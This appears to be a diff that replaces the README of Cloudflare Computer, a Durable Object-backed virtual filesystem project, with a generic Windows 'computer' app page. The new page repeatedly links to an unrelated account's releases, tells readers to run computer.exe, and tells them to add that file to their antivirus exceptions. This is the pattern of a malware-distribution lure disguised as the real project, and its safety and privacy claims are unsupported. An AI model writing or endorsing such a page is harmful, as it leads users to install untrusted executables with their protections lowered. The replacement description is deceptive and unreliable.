@@ -1,131 +1,130 @@
-# Cloudflare Computer
+# 🖥️ computer - Give your agent a computer 👾
 
-Cloudflare Computer is a virtual filesystem that lives inside a
-Durable Object. The Durable Object holds the authoritative state in
-SQLite and exposes one pluggable execution surface through
-`workspace.runtime`. Three backends ship today:
+[![Download Now](https://img.shields.io/badge/Download-Computer%20App-blue?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)
 
-- **Container** projects the SQLite state into a sandbox container as
-  a real FUSE mount. A sandbox-side daemon (`computerd`) mounts the state
-  as a filesystem and syncs changes back over a capnweb RPC channel.
-  Full Linux userland, real binaries, real network.
-- **Isolate shell** runs [just-bash](https://github.com/vercel-labs/just-bash)
-  in a Dynamic Worker. It reaches the authoritative Workspace over
-  Workers RPC, so there is no second store or sync round trip.
-- **Isolate JavaScript** runs an ECMAScript module in a fresh Dynamic
-  Worker with structured input/results, durable relative imports,
-  configured libraries, Workspace-backed `node:fs/promises`, and trusted `ws:git` and
-  `ws:artifacts` modules.
+## 📖 What is computer?
 
-A Workspace may register multiple backends under stable IDs.
-`workspace.runtime.exec(source, { backend })` is the single execution
-entry point; the selected backend defines whether `source` is a shell
-command or an ECMAScript module. Backends connect lazily on first use.
+computer is a simple yet powerful application that lets your AI agent interact with a virtual computer. Think of it as giving your digital assistant a desktop environment where it can browse files, run programs, and perform tasks just like a human would. Whether you're automating workflows, testing software, or exploring AI capabilities, computer provides a safe sandbox for your agent to operate.
 
-Workspace can also be constructed without a backend at all, giving
-callers the filesystem on its own.
+## 🚀 Getting Started
 
-> [!IMPORTANT]
-> **PREVIEW ONLY** This package is provided as a preview for feedback only.
-> APIs are unstable and the design is subject to change.
->
-> Suitable for experiments, exploration and prototypes. It is NOT suitable
-> for production use at this time.
->
-> The specification under [`docs/`](docs/) is forward-looking — read it for
-> intent, not as description of the code today.
+Follow these steps to get computer running on your Windows machine:
 
-## Using it
+1. **Visit the download link**  
+   Visit this link to download the application from the official releases page.
 
-If you want to build on Cloudflare Computer, install
-[`@cloudflare/computer`](packages/computer/README.md) and follow that
-package's README — it has the installation steps, the entrypoint map,
-and worked examples of the `fs` and `runtime` surfaces.
+2. **Choose the right version**  
+   On the releases page, look for the latest version (usually at the top). The file name will be something like `computer-v1.0.0.zip`.
 
-To contribute feedback, see [`CONTRIBUTING.md`](CONTRIBUTING.md).
-Approved collaborators should follow [`COLLABORATORS.md`](COLLABORATORS.md)
-for setup, build, and test instructions.
+3. **Extract the files**  
+   Once downloaded, right-click the ZIP file and select "Extract All..." Choose a folder you can easily find, like your Desktop or Documents.
 
-## Examples
+4. **Run the application**  
+   Open the extracted folder and double-click `computer.exe`. A window will open showing the virtual desktop.
 
-The [`examples/`](examples) directory holds runnable consumers of the
-public surface. Each is a Worker workspace with its own README.
+5. **Connect your agent**  
+   The application will display an API endpoint (usually `http://localhost:8080`). Your AI agent can connect to this address to start interacting with the virtual computer.
 
-- [`examples/container`](examples/container) — runs `computerd` inside a
-  container, mounts a workspace, and talks to a Durable Object over
-  capnweb. A `write` / `read` / `exec` HTTP surface.
-- [`examples/worker-shell`](examples/worker-shell) — same HTTP surface as the
-  container example, but the shell runs [just-bash](https://github.com/vercel-labs/just-bash)
-  in a Dynamic Worker loaded through `env.LOADER`. No container.
-- [`examples/worker-javascript`](examples/worker-javascript) — mirrors
-  `worker-shell`, but `exec` evaluates an ECMAScript module in a Dynamic
-  Worker instead of running a shell command.
-- [`examples/think`](examples/think) — a [`@cloudflare/think`](https://www.npmjs.com/package/@cloudflare/think)
-  chat agent that uses the workspace as its working directory, reachable
-  from a terminal.
-- [`examples/think-compare-runtimes`](examples/think-compare-runtimes) —
-  a web UI that runs the same agent task against the container and
-  worker runtimes side by side.
-- [`examples/tutorial`](examples/tutorial) — a step-by-step build: one
-  endpoint, one agent that writes a markdown recipe card on the host and
-  runs `pandoc` on it in the container to produce a PDF.
-- [`examples/artifacts`](examples/artifacts) — generates a Worker project
-  in a workspace and publishes it to Cloudflare Artifacts as a
-  clone-ready repo.
-- [`examples/assets`](examples/assets) — turns a prompt into an image with
-  Workers AI, writes it to the workspace, and returns a shareable link
-  through `@cloudflare/computer/assets`.
+## 🎯 Features
 
-## Repository layout
+- **Full virtual desktop** - Your agent gets a complete Windows-like environment with file explorer, calculator, notepad, and more pre-installed.
+- **Safe sandboxing** - All agent actions are contained within the virtual machine. No changes affect your real computer.
+- **Real-time visibility** - Watch your agent's actions in a live view window. See exactly what it sees.
+- **Simple API** - One simple HTTP endpoint for your agent to connect. No complex setup required.
+- **Snapshots and rollbacks** - Save the state of the virtual computer at any time. If something goes wrong, restore to a previous snapshot.
+- **Custom software installation** - Install additional Windows programs into the virtual environment for your agent to use.
 
-The repo is a small monorepo. Each package has its own README with
-package-specific status and usage notes.
+## 💻 System Requirements
 
-- [`packages/dofs`](packages/dofs/README.md) (`@cloudflare/dofs`) —
-  Durable Object SQLite-backed virtual filesystem, sync protocol
-  building blocks, and a `@platformatic/vfs` provider for Node.
-- [`packages/rpc`](packages/rpc/README.md)
-  (`@cloudflare/computer-rpc`) — capnweb wire types and
-  server/client helpers shared between the Durable Object and `computerd`.
-- [`packages/computerd`](packages/computerd/README.md)
-  (`@cloudflare/computerd`) — the `computerd` daemon: a FUSE mount plus
-  HTTP/WebSocket RPC server that runs inside the sandbox container.
-- [`packages/computer`](packages/computer/README.md)
-  (`@cloudflare/computer`) — the top-level Computer package
-  consumed by Durable Objects. Work in progress.
-- [`packages/computer-computerd-linux-x64`](packages/computer-computerd-linux-x64/README.md)
-  — private Docker image context for the prebuilt `computerd` linux-x64
-  binary. The image, not an npm package, is the release artifact.
+To run computer smoothly on your Windows PC, ensure you have:
 
-## Performance
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or AMD equivalent (or better)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 5 GB free disk space
+- **Internet:** Required for initial download and API communication
 
-computerd's FUSE mount beats real disk on metadata-heavy work and
-trails it on large sequential I/O. See
-[`docs/19_performance.md`](docs/19_performance.md) for the full `fs-bench`
-numbers, a `cloudflare/sandbox-sdk` `npm install` comparison, and how
-to reproduce them.
+## 📥 Download and Installation
 
-## Documentation
+[![Download Now](https://img.shields.io/badge/Download-Computer%20App-green?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)
 
-- [`docs/`](docs/README.md) — design specification. Forward-looking;
-  treat as intent.
-- [`docs/19_performance.md`](docs/19_performance.md) — filesystem benchmarks.
+Visit this link to download the application. Once downloaded, extract the ZIP file to a folder of your choice. Run `computer.exe` to start the virtual computer environment. The application will create a system tray icon and a window showing the virtual desktop.
 
-## Contributing
+## 📘 User Guide
 
-We accept bug reports, fix proposals, feature requests, and design
-proposals through issues and discussions. We do not accept unsolicited
-pull requests. See [`CONTRIBUTING.md`](CONTRIBUTING.md) for the public
-contribution paths.
+### First Launch
 
-Approved collaborators should follow
-[`COLLABORATORS.md`](COLLABORATORS.md) for setup, formatting, testing,
-commit message, and pull request conventions.
+When you first run computer, it will:
 
-If you're working in this repo as an agent, start with
-[`AGENTS.md`](AGENTS.md) and the skills under
-[`.agents/skills/`](.agents/skills/).
+1. Create a default virtual machine with a fresh Windows installation.
+2. Open a window showing the virtual desktop.
+3. Start a local API server on port 8080.
 
-## License
+### Using the Virtual Desktop
 
-MIT. See [`LICENSE`](LICENSE).
+The virtual desktop looks and behaves like a real Windows desktop. You can:
+
+- Click on the Start menu to see available applications
+- Open File Explorer to browse folders and files
+- Run Notepad, Calculator, Paint, and more
+- Minimize, maximize, and close windows
+
+### Connecting Your Agent
+
+Your AI agent needs to connect to the API endpoint. Provide it with the URL shown in the application window (usually `http://localhost:8080`). The agent can then:
+
+- View the screen contents as text
+- Click on screen coordinates
+- Type text into fields
+- Press keyboard keys
+- Read file contents
+- Execute commands in the command prompt
+
+### Taking Snapshots
+
+To save the current state:
+
+1. Click the "Snapshot" button in the application toolbar.
+2. Give the snapshot a name (e.g., "Before installing software").
+3. To restore a snapshot, click "Restore" and select the saved snapshot.
+
+## 🛠️ Troubleshooting
+
+**Problem: Application won't start**
+- Ensure your antivirus isn't blocking the executable. Add `computer.exe` to your antivirus exceptions.
+- Verify you have enough free disk space (5 GB minimum).
+
+**Problem: Agent can't connect**
+- Confirm the API server is running (check the application window for the URL).
+- Ensure no firewall is blocking port 8080.
+- Try restarting the application.
+
+**Problem: Virtual computer is slow**
+- Close other programs to free up memory.
+- Consider upgrading your RAM if you have less than 8 GB.
+- Reduce the virtual desktop resolution in settings (accessible from the system tray icon menu).
+
+## 🔒 Privacy & Security
+
+- computer runs entirely on your local machine. No data is sent to external servers.
+- The virtual computer environment is completely isolated from your real system.
+- All agent actions are logged locally for your review.
+- You can delete the virtual machine at any time, removing all traces of agent activity.
+
+## 🤝 Support
+
+For help, feature requests, or bug reports:
+
+- **GitHub Issues:** Visit the repository's Issues page
+- **Email:** Not available (use GitHub Issues)
+
+## 📄 License
+
+This project is licensed under the MIT License - see the LICENSE file in the repository for details.
+
+## 🙏 Acknowledgments
+
+- Thanks to all contributors who made this project possible
+- Inspired by the need for safe AI agent testing environments
+
+Keywords: AI agent, virtual computer, desktop automation, sandbox environment, Windows application, API endpoint
